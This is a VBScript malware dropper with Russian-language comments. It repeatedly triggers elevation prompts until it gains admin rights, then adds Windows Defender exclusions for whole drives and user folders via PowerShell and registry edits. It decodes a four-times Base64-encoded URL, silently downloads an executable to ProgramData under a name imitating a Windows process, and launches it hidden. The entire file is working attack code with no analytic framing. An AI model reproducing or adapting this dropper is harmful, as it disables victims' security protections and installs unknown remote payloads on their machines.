Dim objFSO, objShell, objWMI, colProcesses, objProcess
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("Shell.Application")
Set objWMI = GetObject("winmgmts:\\.\root\CIMV2")

On Error Resume Next
Dim testFile
Set testFile = objFSO.CreateTextFile("C:\Windows\System32\test.bat", True)
If Err.Number <> 0 Then
    On Error GoTo 0
    Do
        objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
        WScript.Sleep 3000
        Set colProcesses = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe'")
        If colProcesses.Count > 0 Then Exit Do
    Loop
    
    For Each objProcess in colProcesses
        objProcess.Terminate(0)
    Next
Else
    On Error GoTo 0
    testFile.WriteLine "РЈСЃРїРµС€РЅР°СЏ Р·Р°РїРёСЃСЊ!"
    testFile.Close
    objShell.ShellExecute "cmd.exe", "C:\Windows\System32\test.bat", "", "open", 2
End If

Set WshShell = CreateObject("WScript.Shell")
psCommand = "powershell -Command ""Add-MpPreference -ExclusionPath 'C:\ProgramData'; " & _
    "$desktopPath = [Environment]::GetFolderPath('Desktop'); " & _
    "$downloadsPath = [Environment]::GetFolderPath('UserProfile') + '\Downloads'; " & _
    "Add-MpPreference -ExclusionPath $desktopPath; " & _
    "Add-MpPreference -ExclusionPath $downloadsPath"""
WshShell.Run psCommand, 0, True

userProfile = WshShell.ExpandEnvironmentStrings("%USERPROFILE%")

command1 = "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"" /v C:\ /t REG_DWORD /d 0 /f"
command2 = "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"" /v """ & userProfile & """ /t REG_DWORD /d 0 /f"

WshShell.Run command1, 0, True
WshShell.Run command2, 0, True

Set objShell = CreateObject("WScript.Shell")

' Исходные части закодированной строки Base64 (4 раза закодированный URL)
part3 = "xcWJEQlVSRXBIW"
part1 = "V1ZWb1UwMUhUa2xVVkZwTlpWUn"
part6 = "SWGQ2VTIxb2EyVlViRFZYYkdS"
part4 = "kZad1NGWnFXbXhpYmtKWlZtNXJOV"
part2 = "NkVmxXYUZOaU1sSllVMWhXV2s"
part5 = "0V4Y0ZoU2FrSm9VWHBHTVZscVRsTml"
part7 = "aFpXdDNlV0ZIZUZwV01VbzJWR"
part10 = "kZWM1ZsaFdZVmRIYUhNPQ=="
part8 = "VJKZUdGSFJsaE9TRnBYVFdw"
part9 = "R2QxWlZhRXROY"

' Сборка многоразовой Base64 строки
base64Encoded4 = part1 & part2 & part3 & part4 & part5 & part6 & part7 & part8 & part9 & part10

' Создание декодера Base64
Set base64Decoder = CreateObject("MSXML2.DOMDocument.3.0").createElement("base64")
base64Decoder.dataType = "bin.base64"

' Декодирование пути сохранения файла (1 раз)
base64EncodedPath = "QzpcUHJvZ3JhbURhdGFcV21pUHJ2VkUuZXhlIA=="
base64Decoder.text = base64EncodedPath
decodedPathBytes = base64Decoder.nodeTypedValue
output = BytesToStr(decodedPathBytes)

' Декодирование URL (4 раза)
base64Decoder.text = base64Encoded4
decodedBytes1 = base64Decoder.nodeTypedValue
decodedText1 = BytesToStr(decodedBytes1)

base64Decoder.text = decodedText1
decodedBytes2 = base64Decoder.nodeTypedValue
decodedText2 = BytesToStr(decodedBytes2)

base64Decoder.text = decodedText2
decodedBytes3 = base64Decoder.nodeTypedValue
decodedText3 = BytesToStr(decodedBytes3)

base64Decoder.text = decodedText3
decodedBytes4 = base64Decoder.nodeTypedValue
url = BytesToStr(decodedBytes4)

psCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & output & "'"""
objShell.Run psCommand, 0, True

Function BytesToStr(bytes)
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write bytes
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "utf-8"
    BytesToStr = stream.ReadText
    stream.Close
End Function

Set WshShell = CreateObject("WScript.Shell")
Set objShell = CreateObject("Shell.Application")

manifest = "<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>" & _
"<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">" & _
"<trustInfo xmlns=""urn:schemas-microsoft-com:asm.v3"">" & _
"<security>" & _
"<requestedPrivileges>" & _
"<requestedExecutionLevel level=""asInvoker"" uiAccess=""false""/>" & _
"</requestedPrivileges>" & _
"</security>" & _
"</trustInfo>" & _
"</assembly>"

manifestPath = "C:\ProgramData\WmiPrvVE.exe.manifest"
Set fso = CreateObject("Scripting.FileSystemObject")
Set manifestFile = fso.CreateTextFile(manifestPath, True)
manifestFile.Write(manifest)
manifestFile.Close

WshShell.Run "cmd.exe /c set __COMPAT_LAYER=RunAsInvoker && start """" /B ""C:\ProgramData\WmiPrvVE.exe""", 0, False

WshShell.Run "cmd.exe /c timeout 1 /nobreak > nul", 0, True
